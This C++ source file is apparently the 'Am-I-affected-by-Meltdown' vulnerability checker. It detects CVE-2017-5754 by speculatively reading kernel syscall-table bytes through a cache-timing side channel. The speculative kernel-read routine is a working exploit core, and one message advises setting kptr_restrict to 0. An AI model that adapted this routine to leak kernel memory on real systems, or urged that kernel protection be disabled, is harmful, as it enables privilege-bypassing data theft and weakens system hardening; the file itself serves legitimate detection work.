/*
 * Copyright (c) 2018, Raphael S. Carvalho <raphaelsc@scylladb.com>
 * All rights reserved.
 *
 *Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 * 
 * 1. Redistributions of source code must retain the above copyright notice, this
 * list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright notice,
 * this list of conditions and the following disclaimer in the documentation
 * and/or other materials provided with the distribution.
 * 
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
 * WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR
 * ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
 * (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
 * LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 * The views and conclusions contained in the software and documentation are those
 * of the authors and should not be interpreted as representing official policies,
 * either expressed or implied, of the FreeBSD Project.
 */

#include <cstdio>
#include <unordered_map>
#include <array>
#include <string>
#include <fstream>
#include <iostream>
#include <sstream>
#include <cstdint>
#include <cstdlib>
#include <cstring>
#include <memory>
#include <limits>
#include <algorithm>
#include <sys/mman.h>
#include <errno.h>
#include <unistd.h>
#include <sys/utsname.h>
#include <signal.h>
#include <ucontext.h>
#include <sys/syscall.h>
#include "assembly_utils.hh"

static const char* kernel_symbols_file = "/proc/kallsyms";
static const char* system_map_file_prefix = "/boot/System.map-";
static const char* syscall_table_symbol = "sys_call_table";
static const char* syscall_table_symbol_entry_prefix = "sys_";

static constexpr unsigned syscall_table_entries = 10; // look only a few entries to determine if system is vulnerable.
static constexpr size_t syscall_table_entry_read_retries = 5;
static constexpr size_t total_pages = 256;

// whether or not CPU supports Transactional Synchronization Extensions
// usually available from Intel Haswell generation on.
static bool g_tsx_supported = false;
// TODO: calculate cache hit threshold in run time by averaging the access
// to cached and uncached data.
static const size_t g_cache_hit_threshold = 80;

static inline unsigned page_size() {
    static unsigned __page_size = 0;
    if (!__page_size) {
        __page_size = getpagesize();
    }
    return __page_size;
}

static inline unsigned mem_size() {
    return total_pages * page_size();
}

static void transaction_trap_mitigation(int cause, siginfo_t* info, void* uap) {
    ucontext_t* context = reinterpret_cast<ucontext_t*>(uap);
#ifdef __x86_64__
    context->uc_mcontext.gregs[REG_RIP] = (uintptr_t)__speculative_byte_load_exit;
#else
    context->uc_mcontext.gregs[REG_EIP] = (uintptr_t)__speculative_byte_load_exit;
#endif
}

static inline void setup_transaction_trap_mitigation() {
    struct sigaction sa;
    sa.sa_sigaction = transaction_trap_mitigation;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = SA_SIGINFO;
    if (sigaction(SIGSEGV, &sa, 0)) {
        perror("sigaction");
        exit(1);
    }
}

//
// Retrieves one byte from syscall table at address target_address.
//
static uint8_t probe_one_syscall_table_address_byte(uintptr_t target_address, char* pages, int& status) {
    std::array<unsigned long, total_pages> index_heat;
    index_heat.fill(0);

    static constexpr size_t max_useless_iterations = 50000;
    size_t useless_iterations = 0;

    for (auto r = 0; r < syscall_table_entry_read_retries;) {
        for (auto i = 0; i < total_pages; i++) {
            __clflush(&pages[i * page_size()]);
        }
        // issue dummy syscall. Needed for timing issues which i can't explain it yet.
        syscall(0, 0, 0, 0);

        // Speculatively read byte from kernel address and execute a dependent instruction on
        // buf[read byte * 4096] which makes L1 cache it.
        // Subsequently, we measure access time for i={0..255} buf[i * 4096], and we assume
        // the i of the one with fastest access is the actual byte read from the kernel address.
        if (g_tsx_supported) {
            if (_xbegin() == _XBEGIN_STARTED) {
                __speculative_byte_load(target_address, pages);
                _xend();
            } else {
                // nothing
            }
        } else {
            // falls back to software-based transaction trap mitigation which uses signal handler
            // to go to to exit point in load procedure.
            __speculative_byte_load(target_address, pages);
        }

        static_assert(total_pages <= std::numeric_limits<uint8_t>::max()+1, "total_pages will overflow index");
        bool incr = false;
        for (auto i = 0; i < total_pages; i++) {
            auto duration = __measure_load_execution(&pages[i * page_size()]);

            if (duration <= g_cache_hit_threshold) {
                // we don't increment r twice in the same iteration or result could be compromised due
                // to lack of actual retries, but we still want to account for all durations which met
                // the threshold for when inferring the byte read from kernel address.
                if (!incr) {
                    status = 0;
                    useless_iterations = 0;
                    r++;
                    incr = true;
                }
                index_heat[i]++;
            }
        }
        // TODO: terrible workaround to prevent endless loop in patched systems and still make it work
        // for non patched systems; find a way to fix it!
        if (!incr && useless_iterations++ == max_useless_iterations) {
            // do not throw away old work when bailing out
            status = (r) ? 0 : -1;
            break;
        }
    }
    // Returns the index which was more frequently chosen.
    return std::distance(index_heat.begin(), std::max_element(index_heat.begin(), index_heat.end()));
}

//
// Syscall table is valid if any entry matches the address in the symbol map.
//
static bool validate_syscall_table_entry(const void* data, const std::unordered_map<uintptr_t, std::string>& symbol_map) {
    uintptr_t* entry = (uintptr_t*) data;
    uintptr_t ptr = reinterpret_cast<uintptr_t>(entry[0]);

    if (symbol_map.count(ptr)) {
        auto symbol = symbol_map.at(ptr);
        std::transform(symbol.begin(), symbol.end(), symbol.begin(), ::tolower);
        auto ret = symbol.find(syscall_table_symbol_entry_prefix);
        if (ret > 0 || ret == std::string::npos) {
            return false;
        }
        printf("0x%016lx -> That's %s\n", (uintptr_t)ptr, symbol_map.count(ptr) ? symbol_map.at(ptr).c_str() : "unknown");
        return true;
    }
    return false;
}

//
// Checks if syscall table address actually stores a valid system call by consulting the symbol map.
//
static bool check_one_syscall_table_address(uintptr_t target_address, char* pages, const std::unordered_map<uintptr_t, std::string>& symbol_map) {
    size_t address_size = sizeof(uintptr_t);
    unsigned char buffer[address_size];

    for (auto i = 0; i < address_size; i++) {
        int status = 0;
        buffer[i] = probe_one_syscall_table_address_byte(target_address + i, pages, status);
        if (status == -1) {
            return false;
        }
    }
    return validate_syscall_table_entry(buffer, symbol_map);
}

//
// Builds a map of pointer to symbol from a symbol map file like /proc/kallsyms
//
static std::unordered_map<uintptr_t, std::string> build_symbol_map(std::string fname) {
    std::unordered_map<uintptr_t, std::string> symbol_map;

    std::ifstream infile(fname);
    if (!infile.is_open()) {
        std::cout << "Failed to open " << fname << " due to: " << strerror(errno) << ". Unable to proceed.\n";
        abort();
    }

    std::string line;
    bool non_zero_addr = false;

    while (std::getline(infile, line)) {
        std::istringstream iss(line);
        uintptr_t addr;
        std::string type, symbol;

        if (!(iss >> std::hex >> addr >> type >> symbol)) {
            // lines that start with unexpected content like '(null) A irq_stack_union'
            // will be ignored.
            continue;
        } // error
        non_zero_addr |= addr;

        symbol_map.emplace(addr, std::move(symbol));
    }
    // TODO: fallback to another method if /proc/kallsyms cannot be read.
    if (!non_zero_addr) {
        std::cout << "Unable to read " << fname << ". That means your system doesn't allow non-root or any program to read the file.\n" \
            "Your options are either running the program as root *OR* setting /proc/sys/kernel/kptr_restrict to 0, as follow:\n" \
            "sudo sh -c \"echo 0  > /proc/sys/kernel/kptr_restrict\"\n";
        abort();
    }
    return symbol_map;
}

static uintptr_t symbol_map_reverse_search(const std::unordered_map<uintptr_t, std::string>& symbol_map, std::string symbol) {
    for (auto& p : symbol_map) {
        if (p.second == symbol) {
            return p.first;
        }
    }
    return 0;
}

static inline bool has_TSX() {
    static constexpr int hle_mask = 1<<4;
    static constexpr int rtm_mask = 1<<11;

    unsigned eax = 7;
    unsigned ebx = 0;
    unsigned ecx = 0;
    __cpu_id(eax, ebx, ecx);

    bool has_hle = (ebx & hle_mask) != 0;
    bool has_rtm = (ebx & rtm_mask) != 0;

    return (has_hle && has_rtm);
}

int main(int argc, char** argv) {
    g_tsx_supported = has_TSX();

    if (!g_tsx_supported) {
        setup_transaction_trap_mitigation();
    }

    auto mem = static_cast<char*>(mmap(nullptr, mem_size(), PROT_READ | PROT_WRITE, MAP_ANON | MAP_SHARED, -1, 0));
    if (mem == MAP_FAILED) {
        printf("mmap() failed: %s\n", strerror(errno));
        return -1;
    }

    auto symbol_map = build_symbol_map(kernel_symbols_file);
    auto target_address = symbol_map_reverse_search(symbol_map, syscall_table_symbol);
    if (!target_address) {
        // TODO: find a better alternative than /boot/system_map which requires root.
        // A possible idea is described by Raphael in https://github.com/raphaelsc/Am-I-affected-by-Meltdown/issues/2

        std::cout << "Unable to find symbol " << syscall_table_symbol << " in " << kernel_symbols_file << std::endl;

        // Unable to find syscall table symbol in kernel_symbols_file, so falling back on
        // System.map file stored in /boot, root is required though.
        struct utsname uts;
        auto r = uname(&uts);
        if (r == -1) {
            printf("uname() failed: %s\n", strerror(errno));
            return -1;
        }
        std::string system_map_fname = system_map_file_prefix + std::string(uts.release);
        std::cout << "Falling back on the alternative symbol map file (usually requires root permission): " << system_map_fname << "..." << std::endl;

        symbol_map = build_symbol_map(system_map_fname);
        target_address = symbol_map_reverse_search(symbol_map, syscall_table_symbol);
        if (!target_address) {
            std::cout << "Also unable to find symbol " << syscall_table_symbol << "in alternative symbol map file :-(" << std::endl;
            abort();
        }
    }

    std::cout << "Checking whether system is affected by Variant 3: rogue data cache load (CVE-2017-5754), a.k.a MELTDOWN ...\n";

    printf("Checking syscall table (sys_call_table) found at address 0x%016lx ...\n", (uintptr_t)target_address);

    for (auto entry = 0; entry < syscall_table_entries; entry++) {
        auto ret = check_one_syscall_table_address(target_address + entry * sizeof(uintptr_t), mem, symbol_map);
        if (ret) {
            std::cout << "\nSystem affected! Please consider upgrading your kernel to one that is patched with KPTI/KAISER\n";
            std::cout << "Check https://security.googleblog.com/2018/01/todays-cpu-vulnerability-what-you-need.html for more details\n";
            goto out;
        } else {
            std::cout << "so far so good (i.e. meltdown safe) ...\n";
        }
    }
    std::cout << "\nSystem not affected (take it with a grain of salt though as false negative may be reported for specific environments; " \
        "Please consider running it once again).\n";
out:
    return munmap(static_cast<void*>(mem), mem_size());
}
